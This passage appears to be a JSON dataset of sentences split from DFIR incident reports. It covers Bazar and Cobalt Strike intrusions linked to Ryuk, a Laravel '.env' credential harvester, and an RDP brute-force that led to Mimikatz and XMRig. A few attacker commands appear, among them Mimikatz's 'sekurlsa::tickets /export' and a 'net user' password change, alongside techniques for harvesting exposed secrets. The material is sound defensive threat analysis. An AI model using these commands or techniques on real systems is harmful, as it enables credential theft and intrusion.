    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S46",
        "text": "Reviewing the PowerShell script we can extract the shellcode and run it through scdbg to find the pipe used by the beacon.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 46,
        "index": 6769
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S47",
        "text": "Thanks to 0xtornado and @mattnotmax for this recipe!\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 47,
        "index": 6770
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S48",
        "text": "The threat actors also used SMB beacons executed by remote services as well.",
        "type": "",
        "report": "r-dfir-34",
        "line": 48,
        "index": 6771
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S49",
        "text": "We saw this across most machines in the domain.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 49,
        "index": 6772
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S50",
        "text": "The threat actors also used RDP to login to multiple machines within the domain.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 50,
        "index": 6773
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S51",
        "text": "We did not witness collection events but we do believe files were collected and exfiltrated over encrypted C2 channels.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 51,
        "index": 6774
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S52",
        "text": "We observed the Bazar malware inject into a WerFault process to perform ongoing command and control communication.\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 52,
        "index": 6775
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S53",
        "text": "The AnchorDNS malware performed C2 over DNS to the following domains:\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 53,
        "index": 6776
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S54",
        "text": "No exfiltration was observed but honey docs were taken off network and opened by the threat actors from remote locations.",
        "type": "",
        "report": "r-dfir-34",
        "line": 54,
        "index": 6777
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S55",
        "text": "We assess that this exfiltration was performed over an encrypted C2 channel.",
        "type": "",
        "report": "r-dfir-34",
        "line": 55,
        "index": 6778
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S56",
        "text": "This exfiltration has been going on for months and is rarely talked about when it comes to Wizard Spider.",
        "type": "",
        "report": "r-dfir-34",
        "line": 56,
        "index": 6779
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S57",
        "text": "We believe this intrusion would have ended with domain wide ransomware.",
        "type": "",
        "report": "r-dfir-34",
        "line": 57,
        "index": 6780
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S58",
        "text": "The deployment of the Get-DataInfo.ps1 script and overall TTP\u2019s used in the intrustion are consistent with threat actors associated with deployments of the Ryuk ransomware family.",
        "type": "",
        "report": "r-dfir-34",
        "line": 58,
        "index": 6781
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S59",
        "text": "Enjoy our report?",
        "type": "",
        "report": "r-dfir-34",
        "line": 59,
        "index": 6782
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S60",
        "text": "Please consider donating $1 or more using Patreon.",
        "type": "",
        "report": "r-dfir-34",
        "line": 60,
        "index": 6783
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S61",
        "text": "Thank you for your support!\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 61,
        "index": 6784
    },
    {
        "id": "dfir-reports-filtered/r-dfir-34.md:::S62",
        "text": "We also have pcaps, memory captures, scripts, executables, and Kape packages available here\n",
        "type": "",
        "report": "r-dfir-34",
        "line": 62,
        "index": 6785
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S0",
        "text": "An attacker logged in through RDP a few days ago to run a \u201csmtp cracker\u201d that scans a list of IP addresses or URLs looking for misconfigured Laravel systems.",
        "type": "",
        "report": "r-dfir-35",
        "line": 0,
        "index": 6786
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S1",
        "text": "These attackers are looking for websites that have debug mode enabled, which allows the attacker to see their .env (config) file.",
        "type": "",
        "report": "r-dfir-35",
        "line": 1,
        "index": 6787
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S2",
        "text": "The .env file includes AWS, O365, SendGrid, Twilio credentials and more.",
        "type": "",
        "report": "r-dfir-35",
        "line": 2,
        "index": 6788
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S3",
        "text": "What is Laravel?\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 3,
        "index": 6789
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S4",
        "text": "Laravel is a free, open-source[3] PHP web framework, created by Taylor Otwell and intended for the development of web applications https://en.wikipedia.org/wiki/Laravel\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 4,
        "index": 6790
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S5",
        "text": "Laravel provides drivers for SMTP, Mailgun, Mandrill, Amazon SES, PHP\u2019s mail function, and sendmail, allowing you to quickly get started sending mail through a local or cloud based service of your choice.",
        "type": "",
        "report": "r-dfir-35",
        "line": 5,
        "index": 6791
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S6",
        "text": "https://laravel.com/docs/5.1/mail\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 6,
        "index": 6792
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S7",
        "text": "The debug option is turned off by default on Laravel systems, but it appears many users are enabling debug and not understanding the consequences.",
        "type": "",
        "report": "r-dfir-35",
        "line": 7,
        "index": 6793
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S8",
        "text": "Here\u2019s an example of debug being enabled (set to true) in the .env config file.",
        "type": "",
        "report": "r-dfir-35",
        "line": 8,
        "index": 6794
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S9",
        "text": "web response (not actual config file)\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 9,
        "index": 6795
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S10",
        "text": "You can check to see if debug is enabled by checking for .env in the web root (site.com/.env) or by sending random data to the webserver and reviewing the response.",
        "type": "",
        "report": "r-dfir-35",
        "line": 10,
        "index": 6796
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S11",
        "text": "In the response, you will see the debug option as well as all the information from the .env file, which includes the secrets.",
        "type": "",
        "report": "r-dfir-35",
        "line": 11,
        "index": 6797
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S12",
        "text": "Here\u2019s an example of a web response with debug enabled:\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 12,
        "index": 6798
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S13",
        "text": "Here\u2019s an example of an .env file:\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 13,
        "index": 6799
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S14",
        "text": "The \u201csmtp cracker\u201d script, which by the way\u2013is not a cracker, and grabs more than just smtp credentials; it uses the above methods to crawl a list of IPs/URLs looking for specific strings in the response such as PayPal, AWS_KEY, SES_KEY, Twilio, sendgrid, office365, zoho, mailgun and others.",
        "type": "",
        "report": "r-dfir-35",
        "line": 14,
        "index": 6800
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S15",
        "text": "Here\u2019s part of the script, where it looks for a string in mailhost and outputs the secret(s) to the appropriate file.",
        "type": "",
        "report": "r-dfir-35",
        "line": 15,
        "index": 6801
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S16",
        "text": "The output of the script is saved in a folder named Results.",
        "type": "",
        "report": "r-dfir-35",
        "line": 16,
        "index": 6802
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S17",
        "text": "The results are divided into groups as seen above.\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 17,
        "index": 6803
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S18",
        "text": "Inside those files contain the secrets and method used to extract the information.",
        "type": "",
        "report": "r-dfir-35",
        "line": 18,
        "index": 6804
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S19",
        "text": "This is a partial example of the sendgrid file:\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 19,
        "index": 6805
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S20",
        "text": "This is a partial example of the office365 text file:\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 20,
        "index": 6806
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S21",
        "text": "We are in the process of contacting over 100 people/organizations who\u2019s systems are leaking secrets via Laravel debug in hopes that they will remediate the issue and change their passwords.",
        "type": "",
        "report": "r-dfir-35",
        "line": 21,
        "index": 6807
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S22",
        "text": "If anyone needs help fixing this issue, please use the Contact Us form to get in touch.\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 22,
        "index": 6808
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S23",
        "text": "RDP login as local admin from 64.86.198[.]22.",
        "type": "",
        "report": "r-dfir-35",
        "line": 23,
        "index": 6809
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S24",
        "text": "No brute force attempts were seen from this IP.\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 24,
        "index": 6810
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S25",
        "text": "The attacker installed and used Python 2.7 to execute the smtp cracker script.",
        "type": "",
        "report": "r-dfir-35",
        "line": 25,
        "index": 6811
    },
    {
        "id": "dfir-reports-filtered/r-dfir-35.md:::S26",
        "text": "Pip was used to install 4 modules.\n",
        "type": "",
        "report": "r-dfir-35",
        "line": 26,
        "index": 6812
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S0",
        "text": "This investigation began as many do, with a malicious document delivered via email.",
        "type": "",
        "report": "r-dfir-36",
        "line": 0,
        "index": 6813
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S1",
        "text": "The email and accompanying Excel file purported to be a DocuSign request, which entices the user to enable macros.",
        "type": "",
        "report": "r-dfir-36",
        "line": 1,
        "index": 6814
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S2",
        "text": "This lead to Bazar being dropped on the system, which created a run key for persistence.",
        "type": "",
        "report": "r-dfir-36",
        "line": 2,
        "index": 6815
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S3",
        "text": "On the first day, after the initial activity, nothing else was seen.",
        "type": "",
        "report": "r-dfir-36",
        "line": 3,
        "index": 6816
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S4",
        "text": "On the second day, we observed DNS requests to .bazar domain names (the hallmark of the Bazar malware family).",
        "type": "",
        "report": "r-dfir-36",
        "line": 4,
        "index": 6817
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S5",
        "text": "The malware also executed some basic nltest domain discovery, and a short ping to a Cobalt Strike server, but no additional activity was observed.",
        "type": "",
        "report": "r-dfir-36",
        "line": 5,
        "index": 6818
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S6",
        "text": "On the third day, more communication was observed between the Bazar and Cobalt Strike infrastructure, but again, no downloads or follow-on activity was observed.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 6,
        "index": 6819
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S7",
        "text": "On the fourth day, Bazar pulled down a Cobalt Strike Beacon in the form of a DLL, which was executed via rundll32 and injected into various system processes.",
        "type": "",
        "report": "r-dfir-36",
        "line": 7,
        "index": 6820
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S8",
        "text": "One of those processes injected into, was dllhost, which then ran various PowerSploit commands for discovery activity and dumped credentials from lsass.",
        "type": "",
        "report": "r-dfir-36",
        "line": 8,
        "index": 6821
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S9",
        "text": "Shortly thereafter, the threat actors began moving laterally using multiple techniques, such as:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 9,
        "index": 6822
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S10",
        "text": "- Pass the Hash\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 10,
        "index": 6823
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S11",
        "text": "- SMB executable transfer and exec\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 11,
        "index": 6824
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S12",
        "text": "- RDP\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 12,
        "index": 6825
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S13",
        "text": "- Remote service execution\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 13,
        "index": 6826
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S14",
        "text": "The threat actors then continued pivoting and collecting more information about the environment.",
        "type": "",
        "report": "r-dfir-36",
        "line": 14,
        "index": 6827
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S15",
        "text": "About an hour after beginning their lateral movement, they had compromised a domain controller.",
        "type": "",
        "report": "r-dfir-36",
        "line": 15,
        "index": 6828
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S16",
        "text": "On that domain controller, they executed AdFind, and then dropped a custom PowerShell script named Get-DataInfo.ps1.",
        "type": "",
        "report": "r-dfir-36",
        "line": 16,
        "index": 6829
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S17",
        "text": "This script looks for all active machines and queries installed software, i.e., backup software, security software, etc.",
        "type": "",
        "report": "r-dfir-36",
        "line": 17,
        "index": 6830
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S18",
        "text": "We first saw this script about a year ago when threat actors deployed Ryuk ransomware across a domain.",
        "type": "",
        "report": "r-dfir-36",
        "line": 18,
        "index": 6831
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S19",
        "text": "Other public data has also linked this TTP to Ryuk threat actors.",
        "type": "",
        "report": "r-dfir-36",
        "line": 19,
        "index": 6832
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S20",
        "text": "However, in this case, about 15 minutes after running the script, the threat actor dropped their access and left the environment.",
        "type": "",
        "report": "r-dfir-36",
        "line": 20,
        "index": 6833
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S21",
        "text": "We do not know what caused them to leave, but we have some ideas.",
        "type": "",
        "report": "r-dfir-36",
        "line": 21,
        "index": 6834
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S22",
        "text": "Based on the TTP\u2019s of this intrusion, we assess, with medium to high confidence, that Ryuk would have been the likely ransomware deployed.",
        "type": "",
        "report": "r-dfir-36",
        "line": 22,
        "index": 6835
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S23",
        "text": "Total time in the environment was around 4 days.",
        "type": "",
        "report": "r-dfir-36",
        "line": 23,
        "index": 6836
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S24",
        "text": "We recently started offering intel feeds based on different command and control infrastructure such as Cobalt Strike, Qbot, Trickbot, PoshC2, PS Empire, etc. and this feed would have alerted on the Cobalt Strike C2 in this case.",
        "type": "",
        "report": "r-dfir-36",
        "line": 24,
        "index": 6837
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S25",
        "text": "If you\u2019re interested in pricing or interested in a trial please use Contact Us to get in touch.",
        "type": "",
        "report": "r-dfir-36",
        "line": 25,
        "index": 6838
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S26",
        "text": "Initial access to the environment was via a malicious email that entices a user to download an Excel document with macros using a DocuSign social engineering theme.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 26,
        "index": 6839
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S27",
        "text": "The Excel document required the user to enable content to execute.",
        "type": "",
        "report": "r-dfir-36",
        "line": 27,
        "index": 6840
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S28",
        "text": "The embedded macro in the file was using an Excel 4.0 macro, which at time of execution had a detection rate of 1/63 in Virustotal.",
        "type": "",
        "report": "r-dfir-36",
        "line": 28,
        "index": 6841
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S29",
        "text": "Upon execution of the macro the file reached out to:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 29,
        "index": 6842
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S30",
        "text": "As seen in the contents of the macro below:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 30,
        "index": 6843
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S31",
        "text": "From there a file was written:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 31,
        "index": 6844
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S32",
        "text": "From here the executable then proceeds to create a new file and execute it via cmd.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 32,
        "index": 6845
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S33",
        "text": "Four days post initial access, a Cobalt Strike Beacon was executed via rundll32 and cmd.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 33,
        "index": 6846
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S34",
        "text": "Immediately following the execution of M1E1626.exe, a persistence mechanism was created for the file using a run key.",
        "type": "",
        "report": "r-dfir-36",
        "line": 34,
        "index": 6847
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S35",
        "text": "This file was found to be a BazarBackdoor sample.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 35,
        "index": 6848
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S36",
        "text": "The use of the Cobalt Strike\u2019s piped privilege escalation (Get-System) was used several times during the intrusion.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 36,
        "index": 6849
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S37",
        "text": "After loading the Cobalt Strike DLL, there was an almost instant injection by the process into the Werfault process.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 37,
        "index": 6850
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S38",
        "text": "We also see the Cobalt Strike Beacon running in the dllhost.exe process, loading PowerShell to perform PowerSploit commands in the discovery section.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 38,
        "index": 6851
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S39",
        "text": "Additionally via the use of YARA inspection we found Cobalt Strike running or injected into processes across the environment.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 39,
        "index": 6852
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S40",
        "text": "Lsass was dumped using Cobalt Strike on multiple occasions.",
        "type": "",
        "report": "r-dfir-36",
        "line": 40,
        "index": 6853
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S41",
        "text": "We were not able to recover any proof other than parent/child processes.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 41,
        "index": 6854
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S42",
        "text": "A day after initial access, Bazar initiated some discovery activity using Nltest:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 42,
        "index": 6855
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S43",
        "text": "On the forth day, a Cobalt Strike Beacon was executed and then the following discovery commands were executed.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 43,
        "index": 6856
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S44",
        "text": "On the initial beachhead host, we also saw the Cobalt Strike Beacon initiate the following PowerShell discovery using Powersploit:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 44,
        "index": 6857
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S45",
        "text": "After beginning lateral movement, the threat actors used the following Window\u2019s utilities for system profiling:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 45,
        "index": 6858
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S46",
        "text": "Once the threat actors had access to a domain controller, they ran the following PowerShell discovery:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 46,
        "index": 6859
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S47",
        "text": "After running that, the threat actors used nltest again to confirm domain trusts:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 47,
        "index": 6860
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S48",
        "text": "The local time was also queried on the domain controller:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 48,
        "index": 6861
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S49",
        "text": "AdFind was executed using adf.bat:\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 49,
        "index": 6862
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S50",
        "text": "Finally, the following collection of files were dropped on the domain controller: \n",
        "type": "",
        "report": "r-dfir-36",
        "line": 50,
        "index": 6863
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S51",
        "text": "C:\\Users\\USER\\Desktop\\info\\start.bat start.bat was executed with the following: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\USER\\Desktop\\info\\start.bat\"\"",
        "type": "",
        "report": "r-dfir-36",
        "line": 51,
        "index": 6864
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S52",
        "text": "This script contents show it to be a wrapper for the PowerShell script Get-DataInfo.ps1 The contents of Get-DataInfo.ps1 show a detailed information collector to provide the threat actor with very specific details of the environment.",
        "type": "",
        "report": "r-dfir-36",
        "line": 52,
        "index": 6865
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S53",
        "text": "This includes things like disk size, connectivity, antivirus software, and backup software.",
        "type": "",
        "report": "r-dfir-36",
        "line": 53,
        "index": 6866
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S54",
        "text": "The Ryuk group has used this script for at least a year as we\u2019ve seen them use it multiple times.",
        "type": "",
        "report": "r-dfir-36",
        "line": 54,
        "index": 6867
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S55",
        "text": "This script and files are available @ https://thedfirreport.com/services/\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 55,
        "index": 6868
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S56",
        "text": "The threat actors deployed several types of lateral movements over the course of the intrusion.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 56,
        "index": 6869
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S57",
        "text": "The first observed method was the use of a remote service using PowerShell which injected into winlogon.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 57,
        "index": 6870
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S58",
        "text": "The threat actors also leveraged SMB to send Cobalt Strike Beacon executables to $ADMIN shares and again execute them on the remote systems via a service.",
        "type": "",
        "report": "r-dfir-36",
        "line": 58,
        "index": 6871
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S59",
        "text": "SMB Beacon as its called in Cobalt Strike.",
        "type": "",
        "report": "r-dfir-36",
        "line": 59,
        "index": 6872
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S60",
        "text": "Pass the Hash was also used by the attackers while pivoting through the environment.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 60,
        "index": 6873
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S61",
        "text": "RDP was also leveraged by the attacker via their Cobalt Strike Beacons.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 61,
        "index": 6874
    },
    {
        "id": "dfir-reports-filtered/r-dfir-36.md:::S62",
        "text": "Communication over DNS to .bazar domains.\n",
        "type": "",
        "report": "r-dfir-36",
        "line": 62,
        "index": 6875
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S0",
        "text": "A threat actor recently brute forced a local administrator password using RDP and then dumped credentials using Mimikatz.",
        "type": "",
        "report": "r-dfir-37",
        "line": 0,
        "index": 6876
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S1",
        "text": "They not only dumped LogonPasswords but they also exported all Kerberos tickets.",
        "type": "",
        "report": "r-dfir-37",
        "line": 1,
        "index": 6877
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S2",
        "text": "The threat actor used Advanced IP Scanner to scan the environment before RDPing into multiple systems, including a Domain Controller.",
        "type": "",
        "report": "r-dfir-37",
        "line": 2,
        "index": 6878
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S3",
        "text": "After an hour of moving around the environment, they deployed XMRig on the initial compromised system before logging off.",
        "type": "",
        "report": "r-dfir-37",
        "line": 3,
        "index": 6879
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S4",
        "text": "The threat actor was active on the network for about 2 hours in total.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 4,
        "index": 6880
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S5",
        "text": "The threat actor logged in using RDP from an IP (92.118.13[.]103) that hadn\u2019t attempted any previous logins.",
        "type": "",
        "report": "r-dfir-37",
        "line": 5,
        "index": 6881
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S6",
        "text": "The account was created the previous day using a source IP of 54.38.67[.]132, which had been trying to brute force a local admin password.",
        "type": "",
        "report": "r-dfir-37",
        "line": 6,
        "index": 6882
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S7",
        "text": "The threat actor used a workstation named winstation.",
        "type": "",
        "report": "r-dfir-37",
        "line": 7,
        "index": 6883
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S8",
        "text": "During the intrusion, the threat actors also used 5.122.15[.]138 to login to one of the systems.",
        "type": "",
        "report": "r-dfir-37",
        "line": 8,
        "index": 6884
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S9",
        "text": "The threat actor copied svshost.exe to C:\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 9,
        "index": 6885
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S10",
        "text": "az and then executed it.",
        "type": "",
        "report": "r-dfir-37",
        "line": 10,
        "index": 6886
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S11",
        "text": "This PE creates \u201cXMRig CPU mine.exe\u201d and HideAll.bat in C:\\Windows\\PolicyDefinitions and then executes both of them.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 11,
        "index": 6887
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S12",
        "text": "The PE file that installs XMRig (svshost.exe) also has a script (HideAll.bat) imbedded in it, which is called at runtime.",
        "type": "",
        "report": "r-dfir-37",
        "line": 12,
        "index": 6888
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S13",
        "text": "This is the contents of that batch file.",
        "type": "",
        "report": "r-dfir-37",
        "line": 13,
        "index": 6889
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S14",
        "text": "This script is copied to C:\\Windows\\PolicyDefitions\\ and run, which causes the files specified to be hidden.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 14,
        "index": 6890
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S15",
        "text": "Before the threat actor disconnected, they changed the user password.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 15,
        "index": 6891
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S16",
        "text": "net user %USERNAME% ehs.123\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 16,
        "index": 6892
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S17",
        "text": "Mimikatz was used to dump credentials from memory, as well as, export Kerberos tickets using the following command:\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 17,
        "index": 6893
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S18",
        "text": "The threat actors used a vbs script named launch to execute mimikatz.",
        "type": "",
        "report": "r-dfir-37",
        "line": 18,
        "index": 6894
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S19",
        "text": "This is the content of launch.vbs\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 19,
        "index": 6895
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S20",
        "text": "Since the log parameter was used, the output was saved to mimikatz.log\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 20,
        "index": 6896
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S21",
        "text": "The Kerberos tickets were saved to disk, due to the threat actor using sekurlsa::tickets /export.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 21,
        "index": 6897
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S22",
        "text": "Advanced IP Scanner was used to scan the environment.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 22,
        "index": 6898
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S23",
        "text": "Task manager was opened multiple times.",
        "type": "",
        "report": "r-dfir-37",
        "line": 23,
        "index": 6899
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S24",
        "text": "Possibly looking at logged in users and/or processes.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 24,
        "index": 6900
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S25",
        "text": "Net Accounts was used to review user policies.\n",
        "type": "",
        "report": "r-dfir-37",
        "line": 25,
        "index": 6901
    },
    {
        "id": "dfir-reports-filtered/r-dfir-37.md:::S26",
        "text": "net accounts\n",
        "type": "",
